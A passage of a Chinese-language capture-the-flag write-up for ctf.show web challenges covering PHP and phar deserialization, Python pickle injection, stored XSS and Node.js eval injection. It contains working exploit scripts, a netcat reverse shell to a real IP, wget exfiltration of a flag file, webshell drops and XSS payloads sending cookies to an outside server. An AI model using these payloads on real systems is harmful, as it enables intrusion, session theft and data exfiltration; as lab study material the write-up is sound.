            // IP代理获取标识
            'http_agent_ip'    => 'HTTP_X_REAL_IP',
            // URL伪静态后缀
            'url_html_suffix'  => 'html',
        ];
        public function __construct(){
            $this->hook['visible']=[$this,'isAjax'];
            $this->filter="system";
        }
    }
}
namespace{

    use think\process\pipes\Windows;

    echo base64_encode(serialize(new Windows()));
}
#TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJmZW5nIjthOjE6e3M6NToiaGVsbG8iO3M6NToid29ybGQiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJmZW5nIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjg7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTA6e3M6MTA6InZhcl9tZXRob2QiO3M6NzoiX21ldGhvZCI7czo4OiJ2YXJfYWpheCI7czowOiIiO3M6ODoidmFyX3BqYXgiO3M6NToiX3BqYXgiO3M6MTI6InZhcl9wYXRoaW5mbyI7czoxOiJzIjtzOjE0OiJwYXRoaW5mb19mZXRjaCI7YTozOntpOjA7czoxNDoiT1JJR19QQVRIX0lORk8iO2k6MTtzOjE4OiJSRURJUkVDVF9QQVRIX0lORk8iO2k6MjtzOjEyOiJSRURJUkVDVF9VUkwiO31zOjE0OiJkZWZhdWx0X2ZpbHRlciI7czowOiIiO3M6MTU6InVybF9kb21haW5fcm9vdCI7czowOiIiO3M6MTY6Imh0dHBzX2FnZW50X25hbWUiO3M6MDoiIjtzOjEzOiJodHRwX2FnZW50X2lwIjtzOjE0OiJIVFRQX1hfUkVBTF9JUCI7czoxNToidXJsX2h0bWxfc3VmZml4IjtzOjQ6Imh0bWwiO319fX19fQ==


```

data先传入exp然后多加一个变量补上需要的执行命令

payload:

```php
?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJmZW5nIjthOjE6e3M6NToiaGVsbG8iO3M6NToid29ybGQiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJmZW5nIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjg7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTA6e3M6MTA6InZhcl9tZXRob2QiO3M6NzoiX21ldGhvZCI7czo4OiJ2YXJfYWpheCI7czowOiIiO3M6ODoidmFyX3BqYXgiO3M6NToiX3BqYXgiO3M6MTI6InZhcl9wYXRoaW5mbyI7czoxOiJzIjtzOjE0OiJwYXRoaW5mb19mZXRjaCI7YTozOntpOjA7czoxNDoiT1JJR19QQVRIX0lORk8iO2k6MTtzOjE4OiJSRURJUkVDVF9QQVRIX0lORk8iO2k6MjtzOjEyOiJSRURJUkVDVF9VUkwiO31zOjE0OiJkZWZhdWx0X2ZpbHRlciI7czowOiIiO3M6MTU6InVybF9kb21haW5fcm9vdCI7czowOiIiO3M6MTY6Imh0dHBzX2FnZW50X25hbWUiO3M6MDoiIjtzOjEzOiJodHRwX2FnZW50X2lwIjtzOjE0OiJIVFRQX1hfUkVBTF9JUCI7czoxNToidXJsX2h0bWxfc3VmZml4IjtzOjQ6Imh0bWwiO319fX19fQ==&system=cat /flag
```

![](assets/web274.png)

利用脚本

```python
import requests, base64, time


def round(command: str, arg: str):
    url = "http://ac6ae592-f5db-448b-81bd-3544af090bcb.challenge.ctf.show/"  # 记得保留/
    payload = b'O:27:"think\\process\\pipes\\Windows":1:{s:34:"\x00think\\process\\pipes\\Windows\x00files";a:1:{i:0;O:17:"think\\model\\Pivot":2:{s:9:"\x00*\x00append";a:1:{s:1:"a";a:2:{i:0;s:4:"calc";i:1;s:0:"";}}s:17:"\x00think\\Model\x00data";a:1:{s:1:"a";O:13:"think\\Request":4:{s:7:"\x00*\x00hook";a:1:{s:7:"visible";a:2:{i:0;s:13:"think\\Request";i:1;s:6:"isAjax";}}s:9:"\x00*\x00config";a:10:{s:10:"var_method";s:7:"_method";s:8:"var_ajax";s:6:"whoami";s:8:"var_pjax";s:5:"_pjax";s:12:"var_pathinfo";s:1:"s";s:14:"pathinfo_fetch";a:3:{i:0;s:14:"ORIG_PATH_INFO";i:1;s:18:"REDIRECT_PATH_INFO";i:2;s:12:"REDIRECT_URL";}s:14:"default_filter";s:0:"";s:15:"url_domain_root";s:0:"";s:16:"https_agent_name";s:0:"";s:13:"http_agent_ip";s:14:"HTTP_X_REAL_IP";s:15:"url_html_suffix";s:4:"html";}s:8:"\x00*\x00param";a:1:{s:6:"whoami";s:arg_l:"arg";}s:9:"\x00*\x00filter";a:1:{i:0;s:function_l:"function";}}}}}}'
    payload = payload.replace(b"function_l", str(len(command)).encode())
    payload = payload.replace(b"function", command.encode())
    
    payload = payload.replace(b"arg_l", str(len(arg)).encode())
    payload = payload.replace(b"arg", arg.encode())
    params = {"r": "test/ss", "data": base64.b64encode(payload).decode()}
    while True:
        try:
            resp = requests.get(url, params=params)
            break
        except:
            time.sleep(0.1)
    
    while True:
        try:
            resp = requests.get(url+"1")
            break
        except:
            time.sleep(0.1)
    
    return resp.text


if __name__ == '__main__':
    print("请输入命令...")
    while True:
        command = "system"
        arg = input(">>> ")
        if arg == "exit":
            break
        if arg == "":
            continue
        res = round(command, arg + " | tee 1")
        print(res[:-1])
```

### web275

```php
<?php

/*
# -*- coding: utf-8 -*-
  Author: h1xa
  Date:   2020-12-08 19:13:36
  Last Modified by:   h1xa
  Last Modified time: 2020-12-08 20:08:07
  email: h1xa@ctfer.com
  link: https://ctfer.com

*/


highlight_file(__FILE__);

class filter{
    public $filename;
    public $filecontent;
    public $evilfile=false;

    public function __construct($f,$fn){
        $this->filename=$f;
        $this->filecontent=$fn;
    }
    public function checkevil(){
        if(preg_match('/php|\.\./i', $this->filename)){#检查有没有php或者..
            $this->evilfile=true;
        }
        if(preg_match('/flag/i', $this->filecontent)){
            $this->evilfile=true;
        }
        return $this->evilfile;
    }
    public function __destruct(){#这里直接可以执行命令啊
        if($this->evilfile){
            system('rm '.$this->filename);
        }
    }
}
if(isset($_GET['fn'])){
    $content = file_get_contents('php://input');
    $f = new filter($_GET['fn'],$content);
    if($f->checkevil()===false){
        file_put_contents($_GET['fn'], $content);
        copy($_GET['fn'],md5(mt_rand()).'.txt');
        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
        echo 'work done';
    }
    
}else{
    echo 'where is flag?';
}

where is flag?

```

什么东西？意义不明。**__destruct当对象被销毁时调用，所以我们不需要用到反序列化函数。他的那些过滤也就没用了，那么只要$this->evilfile是true就可以了执行系统命令。**

payload:

```php
GET: ?fn=a||nl+f*  //用||隔开system中的rm命令
POST: flag

或者：
GET:?fn=1;echo '<?php eval($_GET[1]);?>' > 1.php
之后：
GET:?1=system('tac flag.php');
```

看到1就说明成功了。

接下来，ctrl+u

![](assets/web275.png)

### web276（phar反序列化+条件竞争）

phar文件本质是一种压缩文件,会以序列化的形式存储用户定义的meta-data.当受影响的文件操作函数调用phar文件时,会自动反序列化meta-data内的内容

#### 什么是phar文件

在软件中,PHAR(PHP归档)文件是一种打包格式,通过将许多php代码文件和其他资源(如图像 样式表等)捆绑到一个归档文件中来实现应用程序和库的分发.

php通过用户定义的内置的"流包装器"实现复杂的文件处理功能.内置包装器可以用于文件操作系统函数,如[fopen(),copy(),file_exists()和filesize().phar://就是一种内置的流包装器

#### php中一些常见的流包装器

file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流

#### phar文件的结构

stub:phar文件的标志,必须以 xxx __HALT_COMPILER();?>结尾,否则无法识别.xxx可为自定义内容
manifest:phar 文件本质上是一种压缩文件,其中每个被压缩的文件的权限 属性等信息被放在这个部分.这个部分还会以序列化的形式存储用户自定义的meta-data,这是漏洞利用最核心的地方
content:被压缩文件的内容
signature (可空):签名,放在末尾
生成一个phar文件

```php
@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new Test();
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

#### 利用条件

phar文件要能够上传到服务器端
要有可用的魔术方法作为跳板
文件操作函数的参数可控,且: / phar等特殊字符没有被过滤



回到题目

```php
<?php
highlight_file(__FILE__);

class filter{
    public $filename;
    public $filecontent;
    public $evilfile=false;
    public $admin = false;

    public function __construct($f,$fn){
        $this->filename=$f;
        $this->filecontent=$fn;
    }
    public function checkevil(){
        if(preg_match('/php|\.\./i', $this->filename)){
            $this->evilfile=true;
        }
        if(preg_match('/flag/i', $this->filecontent)){
            $this->evilfile=true;
        }
        return $this->evilfile;
    }
    public function __destruct(){
        if($this->evilfile && $this->admin){
            system('rm '.$this->filename);
        }
    }
}

if(isset($_GET['fn'])){
    $content = file_get_contents('php://input');
    $f = new filter($_GET['fn'],$content);
    if($f->checkevil()===false){
        file_put_contents($_GET['fn'], $content);
        copy($_GET['fn'],md5(mt_rand()).'.txt');
        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
        echo 'work done';
    }
    
}else{
    echo 'where is flag?';
}
```

细微差异

```php
public function __destruct(){    
    if($this->evilfile && $this->admin){        
        system('rm '.$this->filename);    
    } 
} 
```

`$admin` 不可控, 并且有文件操作的相关函数, 猜测是 phar:// 反序列化, 再加上条件竞争

思路是先绕过 checkevil 方法上传文件, 然后利用 copy 和 unlink 的时间差, 再利用一个正常的请求通过 phar:// 协议访问之前上传的文件, 触发反序列化



先生成phar.phar

```php
<?php

class filter{
    public $filename = '123; echo \'<?php system($_GET[1]);?>\' > 1.php';
    public $evilfile = true;
    public $admin = true;
}

$o = new filter();

@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test"); 
$phar->stopBuffering();

?>
```

再进行条件竞争(多线程竞争)

```python
import requests
import threading

url = 'http://179e7299-1f16-42cf-a60f-6a8f10dec64b.challenge.ctf.show/'

lock = False

def send_phar():
    with open('phar.phar', 'rb') as f:
        data = f.read()
    _ = requests.post(url + '?fn=phar.txt', data=data)

def unserialize_phar():
    _ = requests.post(url + '?fn=phar://phar.txt', data='123')

def check_shell():
    global lock
    res = requests.get(url + '1.php')
    if res.status_code != 404:
        print('ok')
        lock = True

while not lock:
    t1 = threading.Thread(target=send_phar)
    t2 = threading.Thread(target=unserialize_phar)
    t3 = threading.Thread(target=check_shell)
    t1.start()
    t2.start()
    t3.start()
```

```php
另一个多线程竞争脚本

import requests
import time
import threading


success = False
def getPhar(phar):
    with open(phar,'rb') as p:
        return p.read()


def writePhar(url,data):
    print('writing...')
    requests.post(url,data)
    
def unlinkPhar(url,data):
    print('unlinking...')
    global success
    res = requests.post(url,data)
    if 'ctfshow{' in res.text and success is False:
        print(res.text)
        success = True
        
def main():
    global success
    url = 'http://d5fc2eb4-2fe7-4ce5-961f-6de31f014278.challenge.ctf.show/'
    phar = getPhar('phar.phar')
    while success is False:
        time.sleep(1)
        w = threading.Thread(target=writePhar,args=(url+'?fn=p.phar',phar))
        s = threading.Thread(target=unlinkPhar,args=(url+'?fn=phar://p.phar/test',''))
        w.start()
        s.start()
        
if __name__ == '__main__':
    main()
    
```

![image-20231116174144386](assets/image-20231116174144386.png)

### web277-278（python pickle反序列化，参考先知社区文章《pickle反序列化初探》）

<!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) -->

python完全面向对象

##### 解法一：反弹shell(失败)

```python
import base64
import pickle


class shell(object):
    def __reduce__(self):
        return (eval, ("__import__('os').system('nc 124.223.158.81 9000 -e /bin/sh').read()",))

k = shell()
print(base64.b64encode(pickle.dumps(k)))

```

payload:

```
/backdoor?data=gASVXgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxCX19pbXBvcnRfXygnb3MnKS5wb3BlbignbmMgMTI0LjIyMy4xNTguODEgOTAwMCAtZSAvYmluL3NoJykucmVhZCgplIWUUpQu
```

得去开台服务器了。

##### 解法二：用BurpSuite实现dns外带

```python
import pickle
import base64
import os

class RCE(object):
    def __reduce__(self):
        return (os.system,('wget http://y87gynvxxwzsyv41f1yo4pn9o0urih66.oastify.com/`cat flag`',))

obj = RCE()
payload = pickle.dumps(obj, protocol=0)
print(base64.b64encode(payload))
 #           
Y250CnN5c3RlbQpwMAooVndnZXQgaHR0cDovL3k4N2d5bnZ4eHd6c3l2NDFmMXlvNHBuOW8wdXJpaDY2Lm9hc3RpZnkuY29tL2BjYXQgZmxhZ2AKcDEKdHAyClJwMwou
```

**注意要在 linux 下运行**

**因为 windows 执行 os.system 的时候 opcode 开头是 nt, 而 linux 的开头是 posix,可以看到是不一样的**

![image-20231116174919786](assets/image-20231116174919786.png)

修改一下我们的payload,重新编码

```
Y3Bvc2l4CnN5c3RlbQpwMAooVndnZXQgaHR0cDovL3k4N2d5bnZ4eHd6c3l2NDFmMXlvNHBuOW8wdXJpaDY2Lm9hc3RpZnkuY29tL2BjYXQgZmxhZ2AKcDEKdHAyClJwMwou
```

![image-20231116180551855](assets/image-20231116180551855.png)

##### 解法三：脚本

pickle反序列化基础，无任何过滤
 没有过滤，直接最普通的cos\nsystem\n(S'whoami'tR.即可：
 下面是方便操作的脚本，一个虚拟终端，脚本的原理是python很多web框架都默认设置了一个`static`路由，只需要确保文件夹存在就行了。

```python
import requests, base64, time


def round(command: str, arg: str):
    url = "http://38342d79-0038-4fe8-8f3c-f9fcf455bde2.challenge.ctf.show/"  # 以/结尾
    payload = f'''cos\n{command}\n(S'{arg}'\ntR.'''.encode()
    params = {"r": "test/ss", "data": base64.b64encode(payload).decode()}
    while True:
        try:
            resp = requests.get(url+"backdoor", params=params)
            break
        except:
            time.sleep(0.1)
    
    while True:
        try:
            resp = requests.get(url+"static/1")
            break
        except:
            time.sleep(0.1)
    
    return resp.text


if __name__ == '__main__':
    print("请输入命令...")
    while True:
        command = "system"
        arg = input(">>> ")
        if arg == "exit":
            break
        if arg == "":
            continue
        arg = f'mkdir -p /app/static && {arg} > /app/static/1'
        res = round(command, arg + "")
        print(res[:-1])
```





### 278

只过滤了os.system，但os.popen仍有效
 虽然将上一题脚本中的`system`换成`popen`即可，但是还是给出一个绕过过滤`os`模块的poc
 `cbuiltins\ngetattr\np0\n(cbuiltins\ndict\nS'get'\ntRp1\n(cbuiltins\nglobals\n)RS'__builtins__'\ntRp2\n0g0\n(g2\nS'eval'\ntR(S'whoami'\ntR.`
 本质就是通过getattr函数获取builtins模块中dict类的get方法，然后执行globals()，其返回值是一个dict，所以可以用刚刚得到的get方法获取内部的值，这里选择取出builtins模块本身的引用。等价于执行`dict.get(globals(),'__builtins__')`，利用该引用，就能获取到builtins模块内部的eval方法，再压栈想要执行的命令，然后`R`指令执行，`.`结束符。
 **简化操作的脚本**

```python
import requests, base64, time


def round(command: str, arg: str):
    url = "http://523423e0-bc50-4958-8342-c5ff62103508.challenge.ctf.show/"
    payload = f'''cbuiltins\ngetattr\np0\n(cbuiltins\ndict\nS'get'\ntRp1\n(cbuiltins\nglobals\n)RS'__builtins__'\ntRp2\n0g0\n(g2\nS'eval'\ntR(S'{arg}'\ntR.'''.encode()
    params = {"r": "test/ss", "data": base64.b64encode(payload).decode()}
    while True:
        try:
            resp = requests.get(url+"backdoor", params=params)
            break
        except:
            time.sleep(0.1)
    
    while True:
        try:
            resp = requests.get(url+"static/1")
            break
        except:
            time.sleep(0.1)
    
    return resp.text


if __name__ == '__main__':
    print("请输入命令...")
    while True:
        command = "system"
        arg = input(">>> ")
        if arg == "exit":
            break
        if arg == "":
            continue
        arg = f'__import__("os").popen("mkdir -p /app/static && {arg} > /app/static/1")'
        res = round(command, arg)
        print(res[:-1])
```

结束

# 0x07 XSS

## 写在前面 参考先知文章XSS总结

```js
document.cookie							用于js获取当前网页的cookie值
window.location.href					 用于获取当前页面地址链接
window.location.href='www.baidu.com'	  用于相当于跳转地址

服务器准备的接收文件：xss.php
<?php
$cookie=$_GET['1'];
$myfile=fopen('flag.txt','w+');
fwirte($myfile,$cookie);
fclose($myfile);
?>

http://[ip:port]/xss.php?1=document.cookie用于给服务器发送当前界面的coolie
window.location.href='http://[ip:port]/xss.php?1='+document.cookie	用于指向服务器ip并把当前界面的cookie值作为get参数发送过去
```



## web316

```php
//xss.php
<?php
$content = $_GET['1'];
if(isset($content)){
    file_put_contents('flag.txt','Last update time:'.date("Y-m-d H:i:s")."\n".$content);
}else{
    echo 'no data input';
}
```

```js
<script>document.location.href='http://47.115.219.82:443/xss.php?1='+document.cookie</script>
```

xss.php放你vps上，payload执行后可以在网页目录看到一个flag.txt。首先得到的是你自己的cookie，过会儿xssbot点了才能拿到flag

## web317(过滤了script)

script被过滤了，换个标签即可

```html
<body onload="window.open('http://url/xml.php?1='+document.cookie)"></body>
```

## web318（过滤img）

过滤了img，还是用上题那个payload

## web319

不知道多了啥过滤，反正同上

## web320(过滤空格,/**/绕过，换iframe标签)

空格被ban

```
<iframe/**/onload="window.open('http://47.115.219.82：443/xss.php?1='+document.cookie)"></iframe>
```

## web321

同上

## web322-326（还过滤了xss字符）

增加了过滤，不清楚是什么的情况下就慢慢去试
 从后往前删

```php
document.cookie">
+document.cookie">
xss='+document.cookie">
='http://[ip]/xss.php?1='+document.cookie">
="document.location.href='http://[ip]/xss.php?1='+document.cookie">
onload="document.location.href='http://[ip]/xss.php?1='+document.cookie">
```

以上这些都是能够正常上传的，但再加上前面的一个空格就不行了，从而可知过滤的**空格**

替换方法还是有的：`tab、/**/`

```js
<body/**/onload="document.location.href='http://47.115.219.82：443/1.php?1='+document.cookie"></body>
```

发现还是不行，又试，发现过滤了xss关键字,于是浏览器上的xss.php文件改名1.php

```php
<body/**/onload="document.location.href='http://[ip]/1.php?1='+document.cookie"></body>
```

```html
<body/**/onload="window.open('http://47.115.219.82：443/1.php?1='+document.cookie)"></body>
```

## web327

![img](assets/1-53-1024x627.png)

所以payload还是同上，只不过这次换成了存储型xss，代码被永久地存放在目标服务器的数据库或文件中，只要使用特定url就可以永久执行，而我们上面的反射型xss仅仅是对你这次访问产生了影响，不是持久型攻击（**注意收件人选admin咯**）

## web328(存储xss盗取cookie，替换登录)

这里的逻辑大概就是通过后台查询用户名和密码，然后通过前端的js显示用户名和密码，因为注册密码并没有什么限制，所以这里我们可以尝试通过注册一个密码为payload的用户来进行XSS远程

用户名和密码的源代码不存在单引号或者双引号包裹的可以直接xss，我们去注册个账户，用户名和密码均为：

```php
<script>window.location.href='http://47.115.219.82:443/1.php?1='+document.cookie;</script>
```

这样admin访问管理页面就会强制跳转，我们的服务器也已经收到了带出来的管理员的cookie,之后，登录，替换盗用cookie即可

我们盗用cookie登录即可获得flag:

![img](assets/1-54.png)

## web329（类csrf效果）

和上一题一样直接盗取cookie登录会失效，因为admin的cookie是临时的，不会长久保存，我们在他点击链接的时候把想要的内容拿到就行了

首先得进行一下测试

![image-20231114150746332](assets/image-20231114150746332.png)

可以看到前端代码中将要显示密码的地方类为`laytable-cell-1-0-1`
 那么就能直接遍历出所有的这一项，再F12中的控制台中

```js
$('.laytable-cell-1-0-1').each(function(index,value){
	console.log(value);
});
```

![image-20230705175927317](assets/d56a2c31822fb766f4b489a4ae72278f.png)



可以看到遍历出来了，然后我们可以在下面表单数据中，发现数据对应的变量名是什么

![image-20231114150852419](assets/image-20231114150852419.png)

这里用innerHTML或者innerText都可以
然后的话就是需要在遍历到这个的同时发送给我们的服务器达到xss，另外判断条件因为我们要的是flag，是提前知道形式的，这里就是ctfshow，另外匹配字段被写为'ctf'+'show'是因为如果写成'ctfshow'的话，最终匹配的是我们写进去的XSS Payload，最终得到如下形式：

```html
$('.laytable-cell-1-0-1').each(function(index,value){
    if(value.innerHTML.indexOf('ctfshow')>-1){
        console.log(value.innerHTML);
    }
});
```

![image-20231114151031733](assets/image-20231114151031733.png)

注意这里输出的ctfshow这一句是我自己改的，双击密码可以自己手动改

然后再加上之前的xss注入，得到：

```js
$('.laytable-cell-1-0-1').each(function(index,value){
    if(value.innerHTML.indexOf('ctf'+'show')>-1){
        window.location.href='http://[ip]/1.php?x='+value.innerHTML;
    }
});
```

加上标签，格式化一下(不需要空格)得到payload，利用注册上传：

```js
<script>$('.laytable-cell-1-0-1').each(function(index,value){if(value.innerHTML.indexOf('ctf'+'show')>-1){window.location.href='http://47.115.219.82：443/1.php?x='+value.innerHTML;}});</script>
```

得到flag以及admin用户的密码（ctfshowdacaiji），但这个似乎是admin账号的密码，直接尝试登录，登录进去了，也看到flag了，但是又是一闪而过，抓包获取flag，参考上一题的方法

![image-20231114152239623](assets/image-20231114152239623.png)

```js
<script>window.open('http://47.115.219.82：443/1.php?1='+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)</script>
```

还是和刚刚一样注册的时候账户密码都用这个

## web330（类csrf效果，修改密码）

多了个修改密码的功能：

![img](assets/1-56.png)

这就很明显了，用类似csrf的方法把admin密码改了就行了，注册个号，账号和密码都为：

```
<script>window.location.href='http://127.0.0.1/api/change.php?p=123';</script>
```

最后用账号admin和密码123登录即可

![img](assets/1-57.png)

## web331(post发送，改密码)

还是改密码，只是这次换成了POST方法，修改一下payload：

```js
<script>$.ajax({url:'api/change.php',type:'post',data:{p:'123'}});</script>
```

注册个号，账号和密码都为这个payload，然后用密码123登录admin账户即可：

![img](assets/1-58.png)

## web332

注册账号，转账，抓包，给自己转账，自己有5元，那就转4元，然后发一次，9元，再发一次13元，多发几次，变大之后，找个大数字，发到爆破，多发几次，就买了

![image-20231114154649776](assets/image-20231114154649776.png)

## web333

因为自己给自己转账不扣钱，所以写个脚本一直转就行了

```python
import requests
import re
import time
x=5
url="http://0f268fd6-0995-43d6-9f58-31c1b8ce402f.challenge.ctf.show/api/amount.php"
url2="http://0f268fd6-0995-43d6-9f58-31c1b8ce402f.challenge.ctf.show/api/getFlag.php"
headers={'Cookie':'PHPSESSID=b3rcula2jb86mo11r0v13kg932'}  #自己登录后的sessionid
while True:
	print(x)
	t=x-1
	data={
	'u':'123456', #注册的用户名
	'a':str(t)
	}
	r=requests.post(url,headers=headers,data=data)
	print(r.text)
	if(x>10000):
		r2=requests.get(url2,headers=headers)
		print(r2.text)
		break
	x+=t
```

# 0x08 nodejs

## CTFshow NodeJs web334(代码审计)

前言：做原型链污染，入门的话个人建议先看看P神的文章，只看前四部分就行了。

https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript

当然也可以硬吃菜鸟等教程。

本篇wp，在模板引擎污染并未解释原理，只打了一个payload，是的，我菜。不过确实一开始学就一步一步调试跟进代码去理解模板引擎污染太费时费力也不好理解，先理解基础的原型链污染，让时间帮自己沉淀一下再去细看更深的知识个人感觉是一个高效的方式。

Node.js 是一个基于 Chrome V8 引擎的 Javascript 运行环境。可以说nodejs是一个运行环境，或者说是一个 JS 语言解释器而不是某种库。

Nodejs 是基于 Chrome 的 V8 引擎开发的一个 C++ 程序，目的是提供一个 JS 的运行环境。最早 Nodejs 主要是安装在服务器上，辅助大家用 JS 开发高性能服务器代码，但是后来 Nodejs 在前端也大放异彩，带来了 Web 前端开发的革命。Nodejs 下运行 JS 代码有两种方式，一种是在 Node.js 的交互环境下运行，另外一种是把代码写入文件中，然后用 node 命令执行文件代码。Nodejs 跟浏览器是不同的环境，写 JS 代码的时候要注意这些差异。

源码：

```js
//login.js

var express = require('express');              //引入各个模块
var router = express.Router();
var users = require('../modules/user').items;   //引入用户模块（user.js）

var findUser = function(name, password){          //定义函数
  return users.find(function(item){
    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
  });       //如果name不等于CTFSHOW，并且将name都转为大写与item.name（CTFSHOW）相同，password=123456。则findUser返回true  //toUpperCase()是javascript中将小写转换成大写的函数。
};

/* GET home page. */
router.post('/', function(req, res, next) {                 //POST请求的处理函数
  res.type('html');                                //设置响应（res）的内容类型为html
  var flag='flag_here';
  var sess = req.session;
  var user = findUser(req.body.username, req.body.password);

  if(user){
    req.session.regenerate(function(err) {
      if(err){
        return res.json({ret_code: 2, ret_msg: '登录失败'});        
      }
       

      req.session.loginUser = user.username;
      res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});   //登录成功返回flag
    });

  }else{
    res.json({ret_code: 1, ret_msg: '账号或密码错误'});
  }  

});


module.exports = router;   //通过module.exports将该路由模块导出，以便在其他文件中引入和使用
//user.js

module.exports = {
  items: [
    {username: 'CTFSHOW', password: '123456'}
  ]
};

//这段代码是一个模块文件，通过`module.exports`将一个对象导出。
//在这个模块中，导出的对象是一个包含一个属性`items`的对象。`items`属性是一个数组，包含了一个用户对象。这个用户对象有两个属性：`username`表示用户名为"CTFSHOW"，`password`表示密码为"123456"。

//通过这种方式，其他文件可以引入该模块并访问`items`数组中的用户对象，用于验证用户的登录信息。
payload：
ctfshow   只要不是全大写就行，CTFSHOw  ctfSHow都行
123456
```

## CTFshow NodeJs web335(RCE)

没东西。查看源码。提示/?eval

知道从哪里下手了。

在nodejs中，eval()方法用于计算字符串，并把它作为脚本代码来执行，语法为“eval(string)”；如果参数不是字符串，而是整数或者是Function类型，则直接返回该整数或Function。

这题的代码可能是这样：
eval('console.log(xxx)')

![image-20231115122202707](assets/image-20231115122202707.png)

Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。

```js
?eval=require('child_process').execSync('ls')
?eval=require('child_process').execSync('cat f*')
?eval=require('child_process').execSync('ls').toString()
?eval=require('child_process').execSync('cat fl00g.txt').toString()

?eval=require('child_process').spawnSync('ls').stdout.toString()
?eval=require('child_process').spawnSync('ls',['.']).stdout.toString()
?eval=require('child_process').spawnSync('ls',['./']).stdout.toString()
?eval=require('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString()  //不能通配符

?eval=global.process.mainModule.constructor._load('child_process').execSync('ls',['.']).toString()
```

![image-20231115122232285](assets/image-20231115122232285.png)

## CTFshow NodeJs web336(RCE)

过滤了exec，还有一个同步子进程的函数

```js
require("child_process")['exe'%2B'cSync']('ls')  //拼接绕过
?eval=require('child_process').spawnSync('ls').stdout.toString()
?eval=require('child_process').spawnSync('ls',['.']).stdout.toString()
?eval=require('child_process').spawnSync('ls',['./']).stdout.toString()
?eval=require('child_process').spawnSync('cat',['fl001g.txt']).stdout.toString()  //不能通配符

?eval=global.process.mainModule.constructor._load('child_process').execSync('ls',['.']).toString()
```

![image-20231115122318468](assets/image-20231115122318468.png)别人的wp

```js
传?eval=__filename可以看到路径为/app/routes/index.js

然后传?eval=require(‘fs’).readFileSync(’/app/routes/index.js’,‘utf-8’)可以发现过滤了exec和load //没实现
```

__filename 表示当前正在执行的脚本的文件名。它将输出文件所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。 如果在模块中，返回的值是模块文件的路径。

__dirname 表示当前执行脚本所在的目录。

```js
?eval=require(‘fs’).readdirSync(‘.’) //ls
?eval=require(‘fs’).readFileSync(‘fl001g.txt’,‘utf-8’) //读取文件
```

Y4师傅博客里的一种绕过方法。

![image-20231115122412183](assets/image-20231115122412183.png)

## CTFshow NodeJs web337(nodejs的MD5())

题目直接给了源码。

```js
var express = require('express');
var router = express.Router();
var crypto = require('crypto');

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var flag='xxxxxxx';
  var a = req.query.a;
  var b = req.query.b;
  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);
  }else{
  	res.render('index',{ msg: 'tql'});
  }

});

module.exports = router;
```



```js
if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag))要求我们传参a，b。然后a，b长度一样，然后a不等于b，然后两者加了flag的md5编码一样。
```

注意一下node.js中的拼接问题：

```js
console.log(5+[6,6]); //56,6
console.log("5"+6); //56
console.log("5"+[6,6]); //56,6
console.log("5"+["6","6"]); //56,6
```

所有可能的payload：

```js
?a[a]=x&b[b]=x
?a[a]=1&b[b]=2

?a[x]=1&b[x]=1
?a[x]=1&b[x]=2

?a[:]=1&b[:]=1
?a[:]=1&b[:]=2
```



```js
a={'x':'1'}
b={'x':'2'}
console.log(a+"flag{xxx}")
console.log(b+"flag{xxx}")
二者得出的结果都是[object Object]flag{xxx}，所以md5值也相同
```

